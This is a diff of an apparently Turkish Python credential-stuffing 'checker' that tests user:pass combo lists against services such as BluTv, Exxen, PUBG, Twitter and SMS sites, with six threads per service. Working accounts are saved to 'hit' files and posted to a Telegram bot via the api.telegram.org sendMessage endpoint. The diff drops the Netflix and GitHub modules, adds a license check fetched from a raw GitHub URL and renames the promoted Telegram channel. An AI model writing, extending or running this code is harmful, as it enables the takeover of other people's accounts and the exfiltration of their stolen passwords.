@@ -8,11 +8,6 @@ import random
 import json
 import re
 try:
-    from gdolib import *
-except:
-    os.system("pip install gdolib")
-    from gdolib import *
-try:
     cihaz=open("cihaz.txt","r").read()
 except:
     cihaz="/sdcard/combo/"
@@ -81,6 +76,14 @@ def checker():
     kodq=requests.get("https://raw.githubusercontent.com/yusiqo/anonchat/main/api.txt").text
     print("\nLisansı Telegram Kanalından Ala Bilirsiniz:\nhttps://t.me/owyux")
     
+    kod2=str(input("\nLisans Giriniz: "))
+    kodq=kodq.replace("\n","")
+    if kod2 == kodq:
+        pass
+    else:
+        print("Lisans Değiştirilmiş Veya Yanlış")
+        quit()
+        exit()
     dsy=""
     dirm=cihaz
     say=0
@@ -118,7 +121,7 @@ def checker():
     uz=len(total)
     clear()
     banner()
-    print("Hangi Config?\n1) BluTv\n2) Exxen\n3) SmsOnay.com\n4) Gain\n5) Pubg (mail)\n6) Proxy (http(s))\n7) Twitter (oto combo)\n8) m3u Checker (oto)\n9) Onaylat.com\n10) Kazanio.com\n11) Netflix 12) Github")
+    print("Hangi Config?\n1) BluTv\n2) Exxen\n3) SmsOnay.com\n4) Gain\n5) Pubg (mail)\n6) Proxy (http(s))\n7) Twitter (oto combo)\n8) m3u Checker (oto)\n9) Onaylat.com\n10) Kazanio.com")
     hesap=input(GREEN+"Config No="+ END)
     def m3u():
         import requests
@@ -357,7 +360,7 @@ def checker():
         										   mtl=("""
 ├●🔗m3u_Url➤"""+mlink+"""
 ├●💫 Kategori➤"""+kate+"""
-        ▰▰Channel: @Zetekno▰▰
+        ▰▰Channel: @ZetTekno▰▰
         """)
         										   kod=str(mt+mtl)
         										   print(kod)
@@ -414,7 +417,7 @@ def checker():
 ╭─➢ ☄ ZET| Twitter Checker ☄
 ├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
 ├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
-╰─◉➤ Telegram Channel: @Zetekno\n
+╰─◉➤ Telegram Channel: @ZetTekno\n
             """
                             print(ms)
                             try:
@@ -485,7 +488,7 @@ def checker():
     ├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
     ├◉[𝙿𝚕𝚊𝚗]➢ """+str(lisans)+"""
     ├◉[𝚃𝚊𝚛𝚒𝚑]➢ """+str(LicenseEndDate)+"""
-    ╰─◉➤ Telegram Channel: @Zetekno\n
+    ╰─◉➤ Telegram Channel: @ZetTekno\n
                 """
                                     print(ms)
                                     try:
@@ -576,7 +579,7 @@ def checker():
 ╭─➢ ☄ ZET| SMS Checker ☄
 ├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
 ├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
-╰─◉➤ Telegram Channel: @Zetekno\n
+╰─◉➤ Telegram Channel: @ZetTekno\n
         """
                         print(ms)
                         try:
@@ -728,7 +731,7 @@ def checker():
 ╭─➢ ☄ ZET| Pubg-MAIL Checker ☄
 ├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
 ├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
-╰─◉➤ Telegram Channel: @Zetekno\n
+╰─◉➤ Telegram Channel: @ZetTekno\n
         """
                         print(ms)
                         try:
@@ -897,7 +900,7 @@ def checker():
 ├◉[Pass]➢ """+str(pas)+"""
 ├◉[Pin]➢ """+str(pins)+"""
 ├◉[Tarih]➢ """+str(enddate)+"""
-╰─◉➤ Telegram Channel: @Zetekno\n
+╰─◉➤ Telegram Channel: @ZetTekno\n
         """
                         print(ms)
                         if pins=="Pinsiz":
@@ -988,14 +991,14 @@ def checker():
 ├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
 ├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
 ├◉[ Bakiye ]   """+str(bakiye)+"""
-╰─◉➤ Telegram Channel: @Zetekno\n
+╰─◉➤ Telegram Channel: @ZetTekno\n
             """
                         except:
                             ms="""
 ╭─➢ ☄ ZET| Onaylat.com Checker ☄
 ├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
 ├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
-╰─◉➤ Telegram Channel: @Zetekno\n
+╰─◉➤ Telegram Channel: @ZetTekno\n
             """
                         try:
                             tele=open("tele","r").read()
@@ -1313,14 +1316,14 @@ def checker():
 ├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
 ├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
 ├◉[ Bakiye ]   """+str(bakiye)+"""
-╰─◉➤ Telegram Channel: @Zetekno\n
+╰─◉➤ Telegram Channel: @ZetTekno\n
             """
                         except:
                             ms="""
 ╭─➢ ☄ ZET| Kazanio.com Checker ☄
 ├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
 ├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
-╰─◉➤ Telegram Channel: @Zetekno\n
+╰─◉➤ Telegram Channel: @ZetTekno\n
             """
                         try:
                             tele=open("tele","r").read()
@@ -1631,7 +1634,7 @@ def checker():
 ╭─➢ ☄ ZET| Gain Checker ☄
 ├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
 ├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
-╰─◉➤ Telegram Channel: @Zetekno\n
+╰─◉➤ Telegram Channel: @ZetTekno\n
         """
                         print(ms)
                         try:
@@ -1689,178 +1692,12 @@ def checker():
         a4.start()
         a5.start()
         a6.start()
-
-
-
-
-    def netf():
-        clear()
-        banner()
-        
-        def bsl(mp):
-                try:
-                    mp=mp.replace("\n","")
-                    user = mp.split(':')[0]
-                    pas = mp.split(':')[1]
-                    
-                    try:
-                        Login = login.netflix(user,pas)
-                    except:
-                        print("ip Ban Yedin: 10 Saniye Bekleniyor ...")
-                        time.sleep(10)
-                    ms="""
-╭─➢ ☄ ZET| Netflix Checker ☄
-├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
-├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
-╰─◉➤ Telegram Channel: @Zetekno\n
-        """
-                    if Login['status']=='Success':
-                        print(ms)
-                        try:
-                            tele=open("tele","r").read()
-                            idm=open("idm","r").read()
-                            requests.post(f"https://api.telegram.org/bot{tele}/sendMessage?chat_id={idm}&text={ms}")
-                        except:
-                            pass
-                        open(cihaz+"hit-Netf.txt","a").write(ms)
-                    else:
-                        print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
-                except:
-                    pass
-        def c1():
-            for zet in range(0,uz,6):
-                up=total[zet].split(' ')[0]
-                mp=up.replace("\n","")
-                bsl(mp)
-        def c2():
-            for zet in range(1,uz,6):
-                up=total[zet].split(' ')[0]
-                mp=up.replace("\n","")
-                bsl(mp)
-        def c3():
-            for zet in range(2,uz,6):
-                up=total[zet].split(' ')[0]
-                mp=up.replace("\n","")
-                bsl(mp)
-        def c4():
-            for zet in range(3,uz,6):
-                up=total[zet].split(' ')[0]
-                mp=up.replace("\n","")
-                bsl(mp)
-        def c5():
-            for zet in range(4,uz,6):
-                up=total[zet].split(' ')[0]
-                mp=up.replace("\n","")
-                bsl(mp)
-        def c6():
-            for zet in range(5,uz,6):
-                up=total[zet].split(' ')[0]
-                mp=up.replace("\n","")
-                bsl(mp)
-        import threading
-
-        a1 = threading.Thread(target=c1)
-        a2 = threading.Thread(target=c2)
-        a3= threading.Thread(target=c3)
-        a4= threading.Thread(target=c4)
-        a5= threading.Thread(target=c5)
-        a6= threading.Thread(target=c6)
-        a1.start()
-        a2.start()
-        a3.start()
-        a4.start()
-        a5.start()
-        a6.start()
-
-
-
-
-    def disc():
-            clear()
-            banner()
-            
-            def bsl(mp):
-                    try:
-                        mp=mp.replace("\n","")
-                        user = mp.split(':')[0]
-                        pas = mp.split(':')[1]
-                        
-                        try:
-                            Login = login.github(user,pas)
-                        except:
-                            print("ip Ban Yedin: 10 Saniye Bekleniyor ...")
-                            time.sleep(10)
-                        ms="""
-    ╭─➢ ☄ ZET| Github Checker ☄
-    ├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
-    ├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
-    ╰─◉➤ Telegram Channel: @Zetekno\n
-            """
-                        if Login['status']=='Success':
-                            print(ms)
-                            try:
-                                tele=open("tele","r").read()
-                                idm=open("idm","r").read()
-                                requests.post(f"https://api.telegram.org/bot{tele}/sendMessage?chat_id={idm}&text={ms}")
-                            except:
-                                pass
-                            open(cihaz+"hit-disc.txt","a").write(ms)
-                        else:
-                            print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
-                    except:
-                        pass
-            def c1():
-                for zet in range(0,uz,6):
-                    up=total[zet].split(' ')[0]
-                    mp=up.replace("\n","")
-                    bsl(mp)
-            def c2():
-                for zet in range(1,uz,6):
-                    up=total[zet].split(' ')[0]
-                    mp=up.replace("\n","")
-                    bsl(mp)
-            def c3():
-                for zet in range(2,uz,6):
-                    up=total[zet].split(' ')[0]
-                    mp=up.replace("\n","")
-                    bsl(mp)
-            def c4():
-                for zet in range(3,uz,6):
-                    up=total[zet].split(' ')[0]
-                    mp=up.replace("\n","")
-                    bsl(mp)
-            def c5():
-                for zet in range(4,uz,6):
-                    up=total[zet].split(' ')[0]
-                    mp=up.replace("\n","")
-                    bsl(mp)
-            def c6():
-                for zet in range(5,uz,6):
-                    up=total[zet].split(' ')[0]
-                    mp=up.replace("\n","")
-                    bsl(mp)
-            import threading
-    
-            a1 = threading.Thread(target=c1)
-            a2 = threading.Thread(target=c2)
-            a3= threading.Thread(target=c3)
-            a4= threading.Thread(target=c4)
-            a5= threading.Thread(target=c5)
-            a6= threading.Thread(target=c6)
-            a1.start()
-            a2.start()
-            a3.start()
-            a4.start()
-            a5.start()
-            a6.start()
-
-
-    if hesap=="1":
-        chkblu()
-    if hesap=="2":
+    if hesap =="2":
         chkex()
     if hesap=="3":
         chksms()
+    if hesap=="1":
+        chkblu()
     if hesap=="4":
         chkgain()
     if hesap=="5":
@@ -1875,12 +1712,6 @@ def checker():
         onaylat()
     if hesap=="10":
         kazanio()
-    if hesap=="11":
-        netf()
-    if hesap=="12":
-        disc()
-
-
 def ayar():
     clear()
     banner()
